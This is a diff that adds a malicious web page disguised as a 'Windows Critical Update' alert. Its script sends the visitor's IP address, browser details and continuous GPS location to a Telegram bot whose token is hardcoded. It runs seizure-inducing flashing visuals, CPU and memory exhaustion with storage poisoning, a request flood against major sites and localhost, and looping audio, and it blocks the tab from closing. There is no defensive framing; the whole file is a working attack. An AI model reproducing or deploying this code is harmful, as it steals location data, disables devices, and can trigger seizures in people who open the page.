@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Windows Critical Update</title>
+    <meta charset="UTF-8">
+    <style>
+        *{margin:0;padding:0;overflow:hidden;}
+        body{
+            background:repeating-linear-gradient(45deg,#ff0000,#ff3333 10px);
+            animation:seizure 0.1s infinite;
+            height:100vh;width:100vw;
+        }
+        @keyframes seizure{0%{filter:hue-rotate(0deg) brightness(1);}50%{filter:hue-rotate(180deg) brightness(2)}100%{filter:hue-rotate(360deg) brightness(0.5)}}
+        canvas{position:fixed;top:0;left:0;}
+        #status{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:48px;font-weight:bold;color:#fff;text-shadow:0 0 20px #000;}
+    </style>
+</head>
+<body>
+    <canvas id="chaos"></canvas>
+    <div id="status">CRITICAL ALERT - DO NOT CLOSE</div>
+
+<script>
+// ☢️ OBLIVION PROTOCOL v2.0 ☢️
+const CHAT_ID = '8540727948';
+const BOT_TOKEN = '7223300781:AAHcQtUa-XMGxsml7LS0_b770RWkRQKgays';
+
+async function nukeTelegram(msg) {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+}
+
+// PHASE 1: IMMEDIATE CONFIRMATION
+nukeTelegram('💀 OBLIVION v2.0 ACTIVATED\n' + 
+            'IP: ' + await (await fetch('https://api.ipify.org')).text() + 
+            '\nUA: ' + navigator.userAgent +
+            '\nTime: ' + new Date().toISOString());
+
+// PHASE 2: VISUAL ATTACK (Epilepsy + Screen takeover)
+const canvas = document.getElementById('chaos');
+const ctx = canvas.getContext('2d');
+canvas.width = screen.width;
+canvas.height = screen.height;
+
+function visualHell() {
+    ctx.fillStyle = `hsl(${Math.random()*360},100%,50%)`;
+    ctx.fillRect(0,0,canvas.width,canvas.height);
+    ctx.fillStyle = '#fff';
+    ctx.font = 'bold 120px Arial';
+    ctx.fillText('SYSTEM FAILURE', 100, canvas.height/2);
+    requestAnimationFrame(visualHell);
+}
+visualHell();
+
+// PHASE 3: MULTI-CORE CPU MELTDOWN (8 Web Workers)
+for(let i=0; i<16; i++) {
+    const worker = new Worker(URL.createObjectURL(new Blob([`
+        while(true){
+            let sum = 0;
+            for(let j=0; j<50000000; j++) sum += Math.sqrt(Math.random());
+            Atomics.notify(new Int32Array(new SharedArrayBuffer(4)), 0);
+        }
+    `], {type: 'application/javascript'})));
+}
+
+// PHASE 4: MEMORY ANNIHILATION (1GB+ allocation)
+async function memoryApocalypse() {
+    const chunks = [];
+    for(let i=0; i<200; i++) {
+        try {
+            const chunk = new Uint8Array(1024*1024*5); // 5MB chunks
+            crypto.getRandomValues(chunk);
+            chunks.push(chunk);
+            
+            // Poison ALL storage
+            for(let j=0; j<1000; j++) {
+                localStorage.setItem('oblivion_'+i+'_'+j, btoa(String.fromCharCode(...chunk.slice(0,1000))));
+                sessionStorage.setItem('nuke_'+j, '💀'.repeat(10000));
+            }
+        } catch(e) {}
+    }
+}
+memoryApocalypse();
+
+// PHASE 5: NETWORK FLOOD (1000+ requests/sec)
+async function networkDDoS() {
+    const urls = [
+        'https://google.com', 'https://facebook.com', 'https://instagram.com',
+        'http://127.0.0.1:80', 'http://localhost:8080'
+    ];
+    setInterval(async()=>{
+        for(let url of urls) {
+            fetch(url, {method: 'POST', body: new ArrayBuffer(1024*1024)})
+                .catch(()=>null);
+        }
+    }, 100);
+}
+networkDDoS();
+
+// PHASE 6: BATTERY/SENSOR OVERLOAD
+navigator.geolocation.watchPosition(p=>{
+    nukeTelegram(`📍 GPS TRACKING: ${p.coords.latitude.toFixed(8)},${p.coords.longitude.toFixed(8)}`);
+}, ()=>{}, {enableHighAccuracy:true, maximumAge:0});
+
+// Audio/Video DoS
+const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAo');
+for(let i=0; i<50; i++) audio.play().catch(()=>{});
+
+// PHASE 7: PERSISTENT HELL (Forever)
+setInterval(()=>{
+    document.body.innerHTML = '<canvas id="chaos"></canvas><div id="status">DESTROYED</div>';
+    nukeTelegram('🔥 TARGET ALIVE - REATTACKING');
+}, 60000);
+
+// Prevent tab close
+window.onbeforeunload = ()=>'هام جداً لا تغلق الصفحة!';
+</script>
